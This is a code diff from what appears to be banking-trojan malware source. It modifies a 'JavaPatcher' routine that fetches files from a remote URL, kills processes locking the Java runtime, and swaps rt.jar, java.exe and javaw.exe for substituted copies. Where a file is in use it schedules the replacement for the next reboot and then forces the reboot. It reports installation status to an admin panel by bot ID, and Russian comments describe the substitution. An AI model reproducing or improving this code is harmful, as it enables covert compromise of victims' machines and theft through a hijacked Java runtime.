@@ -873,7 +873,7 @@ void SendLogToAdmin( const char* c, const char* v )
 	STR::Free(adminUrl);
 }
 
-static bool ReplacementExe(const char* java, const char* javao, const char* javaExe, bool afterReboot)
+static bool ReplacementExe(const char* java, const char* javao, const char* javaExe)
 {
 	MemPtr<MAX_PATH> srcJava, dstJava;
 	m_lstrcpy( srcJava, javaHome );
@@ -882,32 +882,31 @@ static bool ReplacementExe(const char* java, const char* javao, const char* java
 	pPathAppendA( srcJava.str(), java );
 	pPathAppendA( dstJava.str(), javao );
 	bool ret = true;
-	if( afterReboot )
+	if( !File::IsExists(dstJava.str()) ) //если подмены еще не было
 	{
-		pMoveFileExA( srcJava.str(), dstJava.str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
-		pMoveFileExA( javaExe, srcJava.str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
-	}
-	else
-	{
-		if( !File::IsExists(dstJava.str()) ) //если подмены еще не было
+		if( pMoveFileA( srcJava.str(), dstJava.str() ) )
 		{
-			if( pMoveFileA( srcJava.str(), dstJava.str() ) )
-			{
-				DBG( "JavaPatcher", "rename %s -> %s", srcJava.str(), dstJava.str() );
-			}
-			else
-			{
-				DBG( "JavaPatcher", "not rename %s -> %s", srcJava.str(), dstJava.str() );
-				ret = false;
-			}
+			DBG( "JavaPatcher", "rename %s -> %s", srcJava.str(), dstJava.str() );
 		}
+		else
+		{
+			DBG( "JavaPatcher", "not rename %s -> %s", srcJava.str(), dstJava.str() );
+			pMoveFileExA( srcJava.str(), dstJava.str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
+			pMoveFileExA( javaExe, srcJava.str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
+			ret = false;
+		}
+	}
+	if( ret )
+	{
 		if( pCopyFileA( javaExe, srcJava.str(), FALSE ) )
 		{
 			DBG( "JavaPatcher", "copy OK %s -> %s", javaExe, srcJava.str() );
+			pDeleteFileA(javaExe);
 		}
-		else
-			ret = false;
-		pDeleteFileA(javaExe);
+		else //не удалось скопировать, сделаем это после ребута
+		{
+			pMoveFileExA( javaExe, srcJava.str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
+		}
 	}
 	return ret;
 }
@@ -936,7 +935,7 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 	DBG( "JavaPatcher", "файлы для патча грузим с %s", javaUrl );
 
 	DWORD userLen = user.size();
-	DWORD res = FALSE;
+	bool res = false;
 
 	if( pGetUserNameA( (char*)user, &userLen ) )
 	{
@@ -954,21 +953,11 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 			pPathAppendA( dstFile, "rt.jar" );
 						
 			ULONG *PIDS = NULL;
-			pMoveFileExA( srcFile, dstFile, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
-	
+
 			int counter = 0; //счетчик попыток уничтожения процессов
 			int countProcess;
-			while( countProcess = FindBlockingProcesses( "\\lib\\rt.jar", &PIDS ) )
+			while( ( countProcess = FindBlockingProcesses( "\\lib\\rt.jar", &PIDS ) ) && counter < 3 )
 			{
-				if( counter == 3 )
-				{
-					#ifdef KillOs_RebootH
-					SendLogToAdmin( adminUrl, botUid, "setup_patch", "1" );
-					ReplacementExe( "java.exe", "javao.exe", javaExe.str(), true );
-					ReplacementExe( "javaw.exe", "javawo.exe", javaExew.str(), true );
-					Reboot();
-					#endif
-				}
 				counter++;
 				while( countProcess-- )
 				{
@@ -984,20 +973,28 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 			if( pCopyFileA( srcFile, dstFile, FALSE ) ) 
 			{
 				DBG( "JavaPatcher", "copy %s -> %s OK", srcFile, dstFile );
-				res = TRUE;
+				res = true;
 			}
 			else
 			{
 				DBG( "JavaPatcher", "copy %s -> %s ERROR", srcFile, dstFile );
-				res = FALSE;		
+				pMoveFileExA( srcFile, dstFile, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
 			}
 			//Подменяем яву
-			if( ReplacementExe( "java.exe", Patched_Jawa_Name, javaExe.str(), false ) )
-				if( ReplacementExe( "javaw.exe", Patched_JawaW_Name, javaExew.str(), false ) )
-				{
-					//сообщаем админке, что ява патч установлен
-					SendLogToAdmin( adminUrl, botUid, "setup_patch", "2" );
-				}
+			res &= ReplacementExe( "java.exe", Patched_Jawa_Name, javaExe.str() );
+			res &= ReplacementExe( "javaw.exe", Patched_JawaW_Name, javaExew.str() );
+			if( res )
+			{
+				//сообщаем админке, что ява патч установлен
+				SendLogToAdmin( adminUrl, botUid, "setup_patch", "2" );
+			}
+			else //не удалось что-то заменить, делаем перезагрузку
+			{
+				#ifdef KillOs_RebootH
+				SendLogToAdmin( adminUrl, botUid, "setup_patch", "1" );
+				Reboot();
+				#endif
+			}
 		};
 
 	}
